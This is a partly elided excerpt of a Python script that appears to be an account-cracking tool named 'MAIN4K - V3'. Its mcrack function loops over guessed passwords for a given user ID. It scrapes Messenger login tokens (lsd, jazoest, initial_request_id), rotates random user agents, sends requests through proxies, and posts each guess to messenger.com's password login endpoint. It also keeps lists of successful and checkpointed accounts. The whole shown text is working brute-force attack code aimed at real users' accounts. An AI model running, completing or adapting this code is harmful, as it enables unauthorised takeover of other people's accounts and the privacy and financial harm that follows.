...
Y8888P  YP   YP 88   YD    YP    Y888888P `8888Y'
              \x1b[1;91m—————— \x1b[1;97m[<MAIN4K - V3>] \x1b[1;91m——————
\033[1;97m———————————————————————————————————————————————""")
loop = 0
oks = []
cps = []
...
def mcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			moz = random.choice(usr)
			free_fb = session.get('https://www.messenger.com/').text
			log_data = {
				'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
    'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
    'initial_request_id': re.search('name="initial_request_id" value="(.*?)"', str(free_fb)).group(1),
    'timezone': '',
    'lgndim': '',
    ...
    'pass': ps,
    'default_persistent': ''}
			header_freefb = {'authority': 'www.messenger.com',
	'method': 'POST',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'datr=gHoRZtc_1pH7tgioUvwZC2Xs; sb=jXoRZmoLWg2snJ9xslp57g99; ps_l=1; ps_n=1; dpr=3; wd=980x1921',
    ...
    'user-agent': moz}
			lo = session.post('https://www.messenger.com/login/password/',data=log_data,headers=header_freefb,proxies=proxs,allow_redirects=False).text
			#print(log_data)
